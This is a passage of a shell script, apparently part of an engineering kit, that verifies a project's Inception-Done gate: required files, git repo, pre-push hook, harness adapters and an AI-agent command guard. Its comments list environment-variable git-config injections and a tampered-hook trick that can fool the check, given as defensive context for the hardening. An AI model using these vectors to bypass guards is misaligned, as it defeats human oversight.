#!/bin/sh
# inception-done.sh — verify the Inception-Done gate (START-HERE.md / DEVELOPMENT-PROCESS.md §3)
# in a project directory. Usage: sh conformance/inception-done.sh [dir]   (default: .)
#          sh conformance/inception-done.sh --selftest   (mutation-proven fixture matrix; T3)
# NOTE: the gate is expected to FAIL at the kit root (the kit is the template source, not an
# instantiated project). It passes only in a project that has completed Inception. The --selftest
# mode is INDEPENDENT of that: it builds its own throwaway project fixtures (git clone/init) and
# asserts the gate's SPECIFIC leg/guard-line verdicts (repo live · hook live · harness-aware guard
# line) — never the whole-gate "OK" verdict, which would pull in the `export-ignore`d ADR/BACKLOG and
# couple the selftest to the tree it runs in. So it passes at the kit root, on an export tree, and for
# a fresh adopter (before their ADR/BACKLOG exist), and is wired as a control check. The one exception
# is cell s2a (SWAS-769), whose fixture writes its own ADR-000 and BACKLOG.md, so it does not depend on the tree.
# A green Inception-Done must mean the ENFORCEMENT SURFACE is PRESENT — not that a config
# file mentions it. So we assert a real git repo (T2.1) and an installed pre-push hook floor
# leg (T2.2), and the runtime-guard line is harness-aware (T2.3), driven by each adapter's
# OWN adapters/<h>/adapter.json .dimensions.command-guard.level — never a hardcoded harness list.
#
# Brownfield-foreign-hook rule (T2.2): the LIVE pre-push hook present + executable + carrying the
#   kit marker => PASS; absent, or the kit's marker but not executable => FAIL; present but NOT
#   the kit's (no marker) => PASS-with-note (a pre-existing hook incept declined to overwrite —
#   the "NOT overwriting" brownfield-safe case; we don't punish it).
# Two install modes (Δ6, HOOK-INSTALL-RECURS-PER-SLICE): WHICH file is "the live hook" is asked of
#   git, not assumed. Default => the installed copy at .git/hooks/pre-push (unchanged, greenfield's
#   incept.sh still installs it at birth). core.hooksPath resolving to the tree's OWN tracked hooks/
#   dir => TRACKED-HOOKS mode, where hooks/pre-push itself is live and no copy is required — the
#   brownfield-recommended one-time keystroke. Any OTHER redirect is not this mode: the leg falls
#   back to the default path and still FAILs when no kit hook is live there.
# Multi-harness rule (T2.3): each declared harness is classified by its adapter.json level. A
#   native adapter runs its declared command-guard check — on PASS we print the PreToolUse leg
#   labelled with that harness; a native adapter whose check FAILs is a FAIL. A floor adapter
#   NEVER prints the PreToolUse leg — it prints the floor message; the floor legs (repo+hook+CI)
#   are asserted globally regardless. Missing adapter.json / jq absent / unreadable level => FAIL
#   (fail-closed — never a silent PASS).
set -eu
# SWAS-945 PR 2: under GITHUB_ACTIONS set to true and SW_ANNOTATE set to 1, this check's column-0 FAIL lines become annotations (problem matcher; scripts/fail-annotate.sh). Before run_gate's cd. No library, no change.
kit_annot_init() { return 0; }
_FA_LIB="$(dirname "$0")/../scripts/fail-annotate.sh"
# shellcheck source=scripts/fail-annotate.sh
if [ -f "$_FA_LIB" ]; then . "$_FA_LIB"; fi
kit_annot_init
# B6 rider (a): resolve_backend is the shared, non-vacuous backend reader (conformance/backlog-lib.sh)
# — sourced here the way its siblings (backlog-current.sh, backlog-presence.sh) already do, so this
# gate's backlog leg reads the same declaration the board gates read, rather than a second, looser
# literal-string grep. Resolved by $0's own dirname, BEFORE run_gate's `cd "$DIR"` below, so sourcing
# stays caller-cwd-independent.
. "$(dirname "$0")/backlog-lib.sh"
# B8: wf_is_deploy() — the SAME deployable derivation deployable-ready.sh uses (single source of
# truth), sourced BEFORE run_gate's `cd "$DIR"` below, so sourcing stays caller-cwd-independent.
. "$(dirname "$0")/wf-helpers.sh"
# SWAS-769: has_data_surface() — the SAME data-backed rule `readiness.sh dr-ready` applies (single source of
# truth), sourced BEFORE run_gate's `cd "$DIR"` below, so sourcing stays caller-cwd-independent. Needs wf-helpers.sh above.
. "$(dirname "$0")/surface-lib.sh"
# B8 fix round 1 (reviewer Minor-3): resolve ci-gates.sh via THIS SCRIPT's own dirname — the same
# caller-cwd-independent convention the two sourcing lines above already use — never relative to
# the target tree run_gate `cd`s into below. A raw/partial adopter tree may have no ci-gates.sh of
# its own; the query must always run the invoking kit's copy, exactly as the disposition FILE
# (read from the target tree) and the QUERY SCRIPT (read from the kit) are two different subjects.
CI_GATES_SH="$(unset CDPATH; cd "$(dirname "$0")" && pwd)/ci-gates.sh"
# SWAS-814: the kit's own waivers-valid.sh, resolved exactly as CI_GATES_SH is (this script's own dirname,
# never the target tree). In an adopter's normal run (`sh conformance/inception-done.sh` inside their tree) $0 IS the
# tree's own copy, so the tree's own waivers-valid.sh answers, exactly as with CI_GATES_SH; only a kit run against
# another directory uses the kit's copy.
# Read only on the plan-limit path of the branch-protection leg, as `--active branch-protection-plan`.
WAIVERS_SH="$(unset CDPATH; cd "$(dirname "$0")" && pwd)/waivers-valid.sh"
# SWAS-945: the repo-class and repo-variable reads reach gh; they set their own trust store inside the macOS agent sandbox (scripts/gh-tls.sh; one probe, in run_gate's
# parent shell, above the branch-protection leg, so its --raw child and the later reads inherit the pin). Resolved by $0's own dirname BEFORE run_gate's `cd`. A missing library means no probe: today's behaviour.
_ID_GHTLS="$(dirname "$0")/../scripts/gh-tls.sh"
# shellcheck source=scripts/gh-tls.sh
if [ -f "$_ID_GHTLS" ]; then . "$_ID_GHTLS"; fi

# ── SWAS-769 — the two-stage Inception split. START-HERE.md's checklist is two lists, "Before your first slice" and
# "Before your first production deploy"; every line there carries one `(id: …)` tag, and these two lists name the same
# ids (selftest cell s2d locks the two together). The first-slice ids are what the legs above and below grade or
# the human boxes loop entry needs; the first-deploy ids are owed before the first production deploy and are NOT
# graded here: the OWED section near the end of run_gate only reports them. The deploy gate that makes them block a deploy
# is a later card (SWAS-829).
ID_FIRST_SLICE_IDS="charter stack-adr repo-protect env-secrets ci-green project-files config roles identities"
ID_FIRST_DEPLOY_IDS="slo envs oncall bia rb-deploy rb-rollback rb-dr rb-monitor"

# ── SWAS-779 — the draft banner. Hard-coded HERE and never read from templates/INCEPTION-DRAFT-TEMPLATE.md, because an agent can edit that
# template; selftest cell dr8 locks the two together. A ratified file that still carries this whole line was moved into place unread.
ID_DRAFT_BANNER='> **DRAFT: inferred from the repository by an agent. Not ratified. A person reviews it and moves what is right into place.**'
# SWAS-907 — the second banner, for the one greenfield draft written from the owner's words (docs/inception-draft/PROJECT-CLAUDE.md). The first line stays
# unchanged, so no in-flight brownfield draft fails open. Double-quoted because the text holds an apostrophe; dr8 locks it against the template too.
ID_DRAFT_BANNER_OWNER="> **DRAFT: written by an agent from the owner's words in session. Not ratified. A person reviews it and moves what is right into place.**"

# _id_owed_spec <id> : sets _id_owf (the file the item lives in) and _id_owt (the template placeholder that, still
# present, means the item is owed; empty = a presence read of the file alone). rc 1 for an id outside the first-deploy
# set. The tokens are mirrored against templates/PROJECT-CLAUDE-TEMPLATE.md and templates/RUNBOOK-TEMPLATE.md by cell s2e.
_id_owed_spec() {
  _id_owt=''
  case "$1" in
    slo)         _id_owf=CLAUDE.md; _id_owt='[soft track-and-guide / hard-gating]' ;;
    envs)        _id_owf=CLAUDE.md; _id_owt='[per-tier deploy trigger]' ;;
    oncall)      _id_owf=CLAUDE.md; _id_owt='| On-call / operator | [...] |' ;;
    bia)         _id_owf=docs/continuity/BIA.md ;;
    rb-deploy)   _id_owf=RUNBOOK.md; _id_owt='[deploy command(s)]' ;;
    rb-rollback) _id_owf=RUNBOOK.md; _id_owt='[rollback command]' ;;
    rb-dr)       _id_owf=RUNBOOK.md; _id_owt='**RPO:** [< 24h default]' ;;
    rb-monitor)  _id_owf=RUNBOOK.md; _id_owt='Error tracking: [tool/link]' ;;
    *) return 1 ;;
  esac
  return 0
}

# ── _id_attest_state : SWAS-813 — does a PRIVATE repository declare GitHub Enterprise Cloud? Sets _id_as to
# declared | absent | unverifiable. The declaration is the GitHub variable KIT_ATTEST_PRIVATE, set at repository
# or organization level; `true` in any case counts (the workflow compares strings without regard to case).
# Read in the order the workflow's `vars` context resolves it: the REPOSITORY variable decides when it exists, with
# any value; the ORGANIZATION list is read only when the repository read is a 404, and matched by the exact name.
#   declared      the deciding value is true.
#   absent        the deciding value is anything else, or the repository read is a 404 and the whole organization list has no entry.
#   unverifiable  a 403 on either read, a 404 on the repository read then any non-answer on the organization read, or any other status.
# Seam: INCEPTION_DONE_GH_VAR_CMD answers both reads (it is called with the API path as its last word, and its failure
# text is read for `HTTP 404`). It is honoured ONLY when _ID_SEAMS is 1, a plain shell variable (never exported, never read
# from the environment) that only selftest() sets, so an exported INCEPTION_DONE_GH_VAR_CMD is ignored in a real run. (The older
# INCEPTION_DONE_GH_CMD seam is the invoker's environment and is unchanged here.) The Actions token cannot read variables,
# so there is no CI leg here (see the leg's header).
_ID_SEAMS=0
_id_attest_state() {
  _id_cmd="gh api"; _id_cmdp="gh api --paginate"
  if [ "$_ID_SEAMS" = 1 ] && [ -n "${INCEPTION_DONE_GH_VAR_CMD:-}" ]; then _id_cmd=$INCEPTION_DONE_GH_VAR_CMD; _id_cmdp=$INCEPTION_DONE_GH_VAR_CMD; fi
  _id_as=unverifiable
  _id_rv=$($_id_cmd "repos/{owner}/{repo}/actions/variables/KIT_ATTEST_PRIVATE" 2>&1) && _id_rc=0 || _id_rc=$?
  if [ "$_id_rc" -ne 0 ]; then
    case "$_id_rv" in *"HTTP 404"*) : ;; *) return 0 ;; esac
    _id_found=no
  else
    _id_val=$(printf '%s' "$_id_rv" | jq -r '.value // empty' 2>/dev/null) || return 0
    _id_found=yes   # MUT-PREC
  fi
  if [ "$_id_found" = no ]; then
    _id_ro=$($_id_cmdp "repos/{owner}/{repo}/actions/organization-variables" 2>&1) && _id_rc=0 || _id_rc=$?   # MUT-ORGREAD
    [ "$_id_rc" -eq 0 ] || return 0
    _id_val=$(printf '%s' "$_id_ro" | jq -r '.variables[]? | select(.name == "KIT_ATTEST_PRIVATE") | .value' 2>/dev/null) || return 0
    _id_val=$(printf '%s\n' "$_id_val" | head -n 1)
  fi
  _id_val=$(printf '%s' "$_id_val" | tr '[:upper:]' '[:lower:]')
  if [ "$_id_val" = true ]; then _id_as=declared; else _id_as=absent; fi
  return 0
}

# ── _id_git <git-args…> : run git with the ambient GIT_DIR/GIT_COMMON_DIR/GIT_WORK_TREE/GIT_INDEX_FILE
# and config-injection (GIT_CONFIG_COUNT/GLOBAL/SYSTEM/NOSYSTEM/GIT_CONFIG/GIT_CONFIG_PARAMETERS)
# families STRIPPED. Ported VERBATIM in shape from guard-wired.sh's _gw_git (SEC HIGH-1; B3 r3 MED-A;
# B3 r4) after review round 1 measured the identical hole HERE: the gate's hook leg asked git which
# file is live, with BARE git calls, so ambient env could answer for a DIFFERENT repo — measured, all
# three vectors flip a genuine "pre-push git hook missing" FAIL into a PASS (fixture (b7)):
#   GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=hooks
#   GIT_CONFIG_PARAMETERS="'core.hookspath'='hooks'"
#   GIT_DIR=<a repo whose OWN config carries the setting>/.git GIT_WORK_TREE=<the tree being judged>
# A gate whose verdict an environment variable can choose is not a gate. HOME/XDG_CONFIG_HOME are
# deliberately NOT stripped, for the reason guard-wired.sh states: they carry the operator's REAL
# global git config, which git also honours at push time, so stripping them would judge a config the
# push never uses. Everything below is local to the subshell and never touches the caller's env.
# ⚠️ `env -u`, NOT `unset` (whole-branch review I-1 / security L1, 2026-09-18): in bash-as-/bin/sh,
# `unset` of a var that carried a TEMPORARY PREFIX assignment over an ALREADY-EXPORTED one RESTORES
# the exported value instead of removing it — measured on vector 3 above too (`GIT_DIR`/`GIT_WORK_TREE`
# survived and the donor repo's config was read). `env -u` removes the name from the CHILD environment
# whatever the shell's unset semantics are; not POSIX, but present in GNU coreutils, the BSDs (macOS
# included) and BusyBox. COUNT=0/PARAMETERS='' stay ASSIGNMENTS: git needs them INERT, not absent, and
# a repo-local key must still be readable.
_id_git() {
  ( GIT_CONFIG_COUNT=0; GIT_CONFIG_PARAMETERS=''
    export GIT_CONFIG_COUNT GIT_CONFIG_PARAMETERS
    env -u GIT_DIR -u GIT_COMMON_DIR -u GIT_WORK_TREE -u GIT_INDEX_FILE -u GIT_CONFIG_GLOBAL \
        -u GIT_CONFIG_SYSTEM -u GIT_CONFIG_NOSYSTEM -u GIT_CONFIG -u GIT_CEILING_DIRECTORIES -u GIT_OBJECT_DIRECTORY -u GIT_ALTERNATE_OBJECT_DIRECTORIES -u GIT_NAMESPACE git "$@" )
}

# ── _id_head_matches <file> : 0 = <file> is byte-identical to HEAD:hooks/pre-push · 1 = it DIFFERS ·
# 2 = the tracked blob could not be materialized (never reported as a match). Sibling of
# guard-wired.sh's _gw_head_matches, for the same compare-first precedence (review round 1 BLOCKER).
_id_head_matches() {
  _idhm_t=$(mktemp 2>/dev/null) || return 2
  if ! _id_git show "HEAD:hooks/pre-push" > "$_idhm_t" 2>/dev/null; then rm -f "$_idhm_t"; return 2; fi
  if cmp -s "$_idhm_t" "$1" 2>/dev/null; then rm -f "$_idhm_t"; return 0; fi
  rm -f "$_idhm_t"; return 1
}

# ── run_gate [dir] : the Inception-Done gate. All FAIL paths accumulate into `fail`; a non-zero
#    `fail` yields a non-zero return. These accumulators are the mutation surface non-vacuity.sh
#    neuters — every one is caught by a negative fixture in selftest() below.
run_gate() {
DIR="${1:-.}"
cd "$DIR"
fail=0
is_repo=0
HARNESSES=''

need() { if [ -e "$1" ]; then echo "PASS present: $1"; else echo "FAIL missing: $1"; fail=1; fi; }

need ENGINEERING-PRINCIPLES.md
need CLAUDE.md
need RUNBOOK.md
need .env.example
# .claude is required on EVERY harness, not only claude-code: the neutral guard core physically lives at
# .claude/hooks/guard-core.sh and every harness's pre-push FLOOR (hooks/pre-push via scripts/kit-guard)
# sources it from there. Dropping this requirement for a floor-only harness would pass Inception with
# no working guard. Relocating the core to a neutral home is boarded (GUARD-CORE-NEUTRAL-HOME, folded
# into the G8 per-segment guard slice); until then the message says WHY rather than hiding it.
if [ -e .claude ]; then
  echo "PASS present: .claude (guard-core home — sourced by every harness's pre-push floor)"
else
  echo "FAIL missing: .claude — required on every harness (not Claude-Code-only): the pre-push floor sources .claude/hooks/guard-core.sh from it (relocation boarded: GUARD-CORE-NEUTRAL-HOME)"; fail=1
fi

# CI pipeline — platform-aware: accept the GitHub OR GitLab path (incept writes one per --ci),
# so a GitLab adopter doesn't dead-end at this gate (it hard-required the GitHub path before).
if [ -f .github/workflows/ci.yml ] || [ -f .gitlab-ci.yml ]; then
  echo "PASS present: CI pipeline (.github/workflows/ci.yml or .gitlab-ci.yml)"
else
  echo "FAIL missing: a CI pipeline (.github/workflows/ci.yml or .gitlab-ci.yml)"; fail=1
fi

# T2.1 (F2) — a real git repo must exist. The runtime guard's floor leg is installed into
# .git/hooks; without a repo there is nothing to enforce. This alone fails the adopter walk.
if _id_git rev-parse --is-inside-work-tree >/dev/null 2>&1; then
  echo "PASS: git repository present (.git)"
  is_repo=1
else
  echo "FAIL: not a git repository — run 'git init' (Inception installs the runtime guard into .git/hooks)"; fail=1
fi

# T2.2 (F2) — the pre-push git-hook FLOOR leg must be actually installed, not merely provided.
# Marker 'KIT_GUARD_CORE' is a stable, guard-specific token in hooks/pre-push (its core-source
# path var); a foreign hook won't carry it. See the brownfield-foreign-hook rule in the header.
if [ "$is_repo" -eq 1 ]; then
  # Δ6 (HOOK-INSTALL-RECURS-PER-SLICE) — TWO INSTALL MODES, both accepted. This leg used to hard-code
  # the default hooks path, so the one-time `core.hooksPath` keystroke that ends the per-slice re-copy
  # treadmill left this gate failing forever (and brownfield.md said so out loud). It now asks git
  # WHICH FILE IS LIVE: `git rev-parse --git-path hooks/pre-push` respects core.hooksPath, and when
  # the answer lands in the tree's OWN tracked hooks/ directory the tracked file IS the live hook —
  # tracked-hooks mode. Any OTHER redirect (husky/lefthook) is NOT this mode: the leg falls back to
  # the default path and keeps its teeth, so one foreign config cannot buy a free pass past the hook
  # leg. Greenfield stays as it was: incept.sh installs the copy at birth; a repo flips later by the
  # same one-time human keystroke.
  HOOK=.git/hooks/pre-push
  HOOKMODE=installed
  _id_hp=$(_id_git config --get core.hooksPath 2>/dev/null || true)
  if [ -n "$_id_hp" ]; then
    _id_top=$(_id_git rev-parse --show-toplevel 2>/dev/null || true)
    _id_live=$(_id_git rev-parse --git-path hooks/pre-push 2>/dev/null || true)
    _id_livedir=""
    _id_wantdir=""
    if [ -n "$_id_live" ]; then
      _id_livedir=$( CDPATH='' cd -- "$(dirname -- "$_id_live")" 2>/dev/null && pwd -P ) || _id_livedir=""
    fi
    if [ -n "$_id_top" ]; then
      _id_wantdir=$( CDPATH='' cd -- "$_id_top/hooks" 2>/dev/null && pwd -P ) || _id_wantdir=""
    fi
    if [ -n "$_id_livedir" ] && [ -n "$_id_wantdir" ] && [ "$_id_livedir" = "$_id_wantdir" ]; then
      # M7 (review round 1): the file git ITSELF named, not a second spelling of it re-derived here —
      # one source of truth for "which file is live", already proven equal to this repo's own hooks/.
      HOOK="$_id_live"
      HOOKMODE=tracked
    fi
  fi
  # COMPARE-FIRST in tracked-hooks mode (review round 1 BLOCKER, mirroring guard-wired.sh): the marker
  # test below is a short-circuit, and in this mode the live hook is the WORKING-TREE file — so a
  # tampered hook with the KIT_GUARD_CORE line DELETED (the shape a cd-basename write produces —
  # GUARD-BASENAME-AFTER-CD-BYPASS now denies the single-command quote-free case in real time, its
  # persisted-cwd/$VAR residuals still produce it) took the reassuring "foreign hook preserved"
  # PASS-with-note while running arbitrary code
  # on push. A tracked file that DIFFERS from HEAD is judged first, marker or no marker; a file that
  # MATCHES HEAD and carries no marker still takes the brownfield note (fixture (b6) locks that, so
  # the cure stays PRECEDENCE and never becomes "no marker => FAIL").
  _id_hm_rc=0
  _id_track_uncomparable=none    # none | committed-missing | unborn (review round 2 m2)
  if [ "$HOOKMODE" = tracked ] && [ -f "$HOOK" ]; then
    if _id_git cat-file -e "HEAD:hooks/pre-push" 2>/dev/null; then
      _id_head_matches "$HOOK" || _id_hm_rc=$?
    elif _id_git rev-parse --verify -q HEAD >/dev/null 2>&1; then
      # HEAD EXISTS but does NOT track hooks/pre-push — the live hook was never committed even though
      # a baseline was, so it evades the committed tree and cannot be compared against it. This is the
      # real evasion state, and guard-wired.sh REDs exactly it (its tracked "missing from HEAD" FAIL);
      # the mirror agrees. Review round 2 m2 closed the fail-OPEN where the old `else` set this to 0
      # ("verified match") and an uncomparable live hook PASSed as verified.
      _id_track_uncomparable=committed-missing
    else
      # UNBORN HEAD — the repo has no commits at all, so there is genuinely nothing to compare the
      # live hook against. Deliberately NOT the same verdict as guard-wired's blanket RED here (m2
      # decision, stated): inception-done is the gate most likely to meet a pre-first-commit tree,
      # and red-ing the hook's *freshness* on a tree that has committed nothing would blame this leg
      # for a pre-baseline state other steps own. It is not a tamper. But it is also NOT verified —
      # so it takes an honest N/A that never prints the "live via tracked-hooks mode" PASS, closing
      # requirement (a) while not false-RED-ing a legitimate no-commits tree (requirement b).
      _id_track_uncomparable=unborn
    fi
  fi
  if [ ! -f "$HOOK" ]; then
    if [ "$HOOKMODE" = tracked ]; then
      echo "FAIL: pre-push git hook missing ($HOOK) — this repo runs tracked-hooks mode (core.hooksPath names its own hooks/ dir), so hooks/pre-push IS the live hook and this checkout has none: restore it (git restore -- hooks/pre-push) or copy the kit's hooks/pre-push back  (do NOT re-run incept — see docs/adoption/brownfield.md)"; fail=1
    else
      echo "FAIL: pre-push git hook missing ($HOOK) — install it (human step; an agent cannot set the mode): cp hooks/pre-push $HOOK && chmod +x $HOOK  (brownfield: do NOT re-run incept — see docs/adoption/brownfield.md)"; fail=1
    fi
  elif [ "$_id_hm_rc" -eq 1 ]; then
    echo "FAIL: pre-push git hook $HOOK is MODIFIED in the working tree — in tracked-hooks mode that file IS the live hook, so what git runs on push is not what this tree carries under review: restore it (git restore -- hooks/pre-push) or commit it"; fail=1
  elif [ "$_id_hm_rc" -eq 2 ]; then
    echo "FAIL: pre-push git hook $HOOK could not be compared against tracked HEAD:hooks/pre-push — an unverifiable live hook is not a verified one"; fail=1
  elif [ "$_id_track_uncomparable" = committed-missing ]; then
    echo "FAIL: pre-push git hook $HOOK — tracked-hooks mode, but hooks/pre-push is not committed at HEAD, so the LIVE hook evades the committed baseline and cannot be verified against it: commit it (git add hooks/pre-push && git commit). Mirrors guard-wired's tracked 'missing from HEAD'."; fail=1
  elif [ "$_id_track_uncomparable" = unborn ]; then
    echo "N/A: pre-push git hook $HOOK present in tracked-hooks mode, but the repo has NO commits yet (HEAD unborn) — nothing committed to compare the live hook against; commit the baseline (docs/adoption/brownfield.md §2 step 5). NOT counted as a verified guard."
  elif grep -q 'KIT_GUARD_CORE' "$HOOK" 2>/dev/null; then
    if [ -x "$HOOK" ]; then
      if [ "$HOOKMODE" = tracked ]; then
        echo "PASS present: pre-push git hook live via tracked-hooks mode (core.hooksPath -> this repo's own hooks/; the tracked hooks/pre-push IS the live hook — no installed copy to keep fresh)"
      else
        echo "PASS present: pre-push git hook installed and executable (kit runtime guard)"
      fi
    elif [ "$HOOKMODE" = tracked ]; then
      echo "FAIL: pre-push git hook present but not executable ($HOOK) — git silently ignores it; in tracked-hooks mode the exec bit is a TRACKED file mode, so set it and commit (human step): chmod +x $HOOK && git add --chmod=+x $HOOK"; fail=1
    else
      echo "FAIL: pre-push git hook present but not executable ($HOOK) — set the mode (human step): chmod +x $HOOK  (brownfield: do NOT re-run incept)"; fail=1
    fi
  else
    echo "PASS (note): pre-push git hook present but not the kit's (foreign hook preserved — brownfield 'NOT overwriting' case); kit guard is not managing it"
  fi
else
  echo "SKIP: pre-push git-hook check — not a git repository (see the repo failure above)"
fi

if ls docs/architecture/ADR-000*.md >/dev/null 2>&1; then
  echo "PASS present: docs/architecture/ADR-000*.md"
else
  echo "FAIL missing: docs/architecture/ADR-000*.md"; fail=1
fi

# B6 rider (a): read the declaration with resolve_backend (the same reader backlog-current.sh /
# backlog-presence.sh use), NOT a literal `grep -q "Backlog backend"` — that literal grep matched the
# FIELD NAME even when its value is still the unfilled choice-list placeholder
# (`Backlog backend (§...): [md/github/jira/ado/linear/gitlab]`), so an adopter who never actually
# chose a backend passed Inception-Done and then every board gate silently N/A'd forever (the
# measured defect; the negative fixture below is exactly this CLAUDE.md). resolve_backend treats an
# unfilled choice-list as UNDECLARED (empty), same as a wholly absent field — so this leg now agrees
# with what the board gates will actually see. Fail-CLOSED on `unrecognized:*` (a fat-fingered token
# like `markdow`): that must not be silently accepted as "some backend is declared".
_id_tok=$(resolve_backend "." 2>/dev/null || true)
case "$_id_tok" in
  unrecognized:*)
    echo "FAIL: backlog backend '${_id_tok#unrecognized:}' is not a recognized token (known: md github jira ado linear gitlab) — fix CLAUDE.md's Backlog backend field"; fail=1 ;;
  '')
    if [ -f BACKLOG.md ]; then
      echo "PASS present: backlog (BACKLOG.md present; no explicit backend declared in CLAUDE.md)"
    else
      echo "FAIL missing: BACKLOG.md or a declared backlog backend (CLAUDE.md's Backlog backend field is absent or still the unfilled choice-list placeholder)"; fail=1
    fi ;;
  *)
    echo "PASS present: backlog (declared backend: $_id_tok)" ;;
esac

# project CLAUDE.md key header fields must be filled (no leftover placeholders)
if grep -Eq '\*\*Project:\*\* \[name\]|\*\*Intent owner:\*\* \[(who owns|owed)' CLAUDE.md 2>/dev/null; then
  echo "FAIL: project CLAUDE.md key fields not filled (Project / Intent owner)"; fail=1
else
  echo "PASS: project CLAUDE.md key header fields filled"
fi

# the Target harness(es) field must be stamped AND every selected adapter must conform to the
# boundary contract — the Inception-Done enforcement of the harness floor (brownfield-critical:
# an adopter's merged repo can't pass Inception until its declared adapter(s) actually conform).
hline=$(grep -E '^\- \*\*Target harness\(es\)\*\*' CLAUDE.md 2>/dev/null || true)
if [ -z "$hline" ]; then
  echo "FAIL: project CLAUDE.md missing the Target harness(es) field"; fail=1
else
  # value after the '(§harness-neutrality): ' marker, first whitespace token (the comma-list)
  hval=$(printf '%s' "$hline" | sed 's/^.*(§harness-neutrality): *//' | cut -d' ' -f1)
  case "$hval" in
    *'['*|'') echo "FAIL: Target harness(es) not stamped (placeholder remains)"; fail=1 ;;
    *)
      for _h in $(printf '%s' "$hval" | tr ',' ' '); do
        _h=$(printf '%s' "$_h" | sed 's/[[:punct:][:space:]]*$//')  # G13: tolerate a trailing period/space in the stamped value
        [ -z "$_h" ] && continue
        HARNESSES="$HARNESSES $_h"  # T2.3: resolved list feeds the harness-aware runtime-guard leg below
        if ! [ -d "adapters/$_h" ]; then
          echo "FAIL: harness adapter '$_h' directory not found — expected: adapters/$_h"; fail=1
        elif sh conformance/harness-adapter.sh "adapters/$_h" >/dev/null 2>&1; then
          echo "PASS: harness adapter '$_h' conforms to the boundary contract"
        else
          echo "FAIL: harness adapter '$_h' does not conform — run: sh conformance/harness-adapter.sh adapters/$_h"; fail=1
        fi
      done ;;
  esac
fi

# T2.3 (F3) — harness-aware runtime-guard leg. Classify EACH declared harness by its OWN
# adapters/<h>/adapter.json .dimensions.command-guard.level (never a hardcoded name list), so
# the gate's claim and the incept notice's honesty cannot diverge. See the multi-harness rule
# in the header. Fail-closed: no harness resolved / jq absent / json missing / level unreadable.
if [ -z "$HARNESSES" ]; then
  echo "FAIL: runtime-guard leg — no target harness resolved, cannot classify command-guard (fail-closed)"; fail=1
elif ! command -v jq >/dev/null 2>&1; then
  echo "FAIL: runtime-guard leg UNVERIFIED — jq absent, cannot read adapters/<h>/adapter.json command-guard level (fail-closed)"; fail=1
else
  for _h in $HARNESSES; do
    _aj="adapters/$_h/adapter.json"
    if [ ! -f "$_aj" ]; then
      echo "FAIL: runtime-guard leg — $_aj missing, cannot classify '$_h' command-guard (fail-closed)"; fail=1; continue
    fi
    _lvl=$(jq -r '.dimensions."command-guard".level // empty' "$_aj" 2>/dev/null || true)
    case "$_lvl" in
      native)
        _chk=$(jq -r '.dimensions."command-guard".proof.check // empty' "$_aj" 2>/dev/null || true)
        [ -n "$_chk" ] || _chk="conformance/guard-wired.sh"
        # B3 r3 HIGH-A: mirrored in conformance/harness-adapter.sh's native_proof_ok() (search
        # "closed kit-owned allowlist" there) — change both. Parse: path = first token; OPTIONALLY
        # one scoped flag token after ONE space, from the SAME closed kit-owned allowlist as
        # harness-adapter.sh (currently just `--rung1-only`) — never an open charset. A second
        # token, or a space with an EMPTY remainder (a bare trailing space), is rejected, not run
        # bare. Without this mirror, a manifest whose proof.check carries a flag (e.g.
        # `"conformance/guard-wired.sh --rung1-only"`) fails `[ -f ]` on the WHOLE string and,
        # even if that happened to resolve, would run `sh "$_chk" .` — the flag and the tree arg
        # collapsed into one un-split word — so every claude-code adopter's Inception gate
        # hard-failed with a false "missing" message (measured).
        _chkpath="$_chk"; _chkflag=""; _chkbad=0
        case "$_chk" in
          *' '*)
            _chkpath=${_chk%% *}
            _chkrest=${_chk#* }
            case "$_chkrest" in
              *' '*) _chkbad=1 ;;   # a second token => reject (one flag, never more)
              '')    _chkbad=1 ;;   # trailing space, empty remainder => reject, not a bare run
              *)     _chkflag=$_chkrest ;;
            esac ;;
        esac
        if [ "$_chkbad" -eq 0 ] && [ -n "$_chkflag" ]; then
          case "$_chkflag" in
            --rung1-only) : ;;   # <- extension point: add one case arm per kit-defined scoped flag
            *) _chkbad=1 ;;
          esac
        fi
        if [ "$_chkbad" -eq 0 ]; then
          case "$_chkpath" in
            conformance/*.sh) : ;;
            *) _chkbad=1 ;;
          esac
        fi
        if [ "$_chkbad" -eq 0 ] \
           && { printf '%s' "$_chkpath" | grep -Eq '[^A-Za-z0-9._/-]' || printf '%s' "$_chkpath" | grep -q '\.\.'; }; then
          _chkbad=1
        fi
        if [ "$_chkbad" -ne 0 ] || [ ! -f "$_chkpath" ] || [ -L "$_chkpath" ]; then
          echo "FAIL: '$_h' declares command-guard=native but its check '$_chk' is missing or invalid (fail-closed)"; fail=1
        else
          # three-state, mirroring guard-wired: 0 wired · 2 UNVERIFIED (jq) · 1 dark — fail-closed on 1/2.
          # Flag BEFORE the tree arg (guard-wired.sh's own documented order: `--rung1-only [dir]`).
          if [ -n "$_chkflag" ]; then
            if sh "$_chkpath" "$_chkflag" . >/dev/null 2>&1; then gw=0; else gw=$?; fi
          else
            if sh "$_chkpath" . >/dev/null 2>&1; then gw=0; else gw=$?; fi
          fi
          if [ "$gw" -eq 0 ]; then
            echo "PASS: '$_h' runtime guard wired (PreToolUse → guard.sh, matcher admits mutating tools) [native, via $_chk]"
          elif [ "$gw" -eq 2 ]; then
            echo "FAIL: '$_h' runtime guard wiring UNVERIFIED — install jq (the guard hook needs it too), then: sh $_chk"; fail=1
          else
            echo "FAIL: '$_h' runtime guard not wired — run: sh $_chk"; fail=1
          fi
        fi ;;
      floor)
        echo "PASS: runtime guard = floor (git hook + CI backstop); '$_h' has no inline command-guard (by design — adapter declares command-guard=floor)" ;;
      *)
        echo "FAIL: '$_h' command-guard level unreadable ('${_lvl:-<empty>}') in $_aj (fail-closed)"; fail=1 ;;
    esac
  done
fi

# ── Branch-protection leg (K5). MODE strict (default) | surface. GitHub -> live verify via
#    branch-protection.sh --raw (we apply our OWN policy, never its CI-collapsed exit). Non-GitHub
#    -> a recorded CLAUDE.md attestation. No remote -> outstanding/fatal per mode. exit 1
#    (verified-unprotected) is fatal in BOTH modes; unverifiable is fatal only in strict.
MODE="${MODE:-strict}"
# SWAS-945: the probe, once, in the parent shell, BEFORE the first gh read of the gate: the branch-protection.sh --raw child below inherits the pin, and so do the
# gate-provenance reads after it (not when the INCEPTION_DONE_GH_CMD seam stands in for gh).
if [ "$is_repo" -eq 1 ] && [ -z "${INCEPTION_DONE_GH_CMD:-}" ] && command -v kit_gh_tls_pin >/dev/null 2>&1; then kit_gh_tls_pin; fi
if [ "$is_repo" -ne 1 ]; then
  echo "SKIP: branch-protection leg — not a git repository (see the repo failure above)"
else
  _remote=$(git remote get-url origin 2>/dev/null || true)
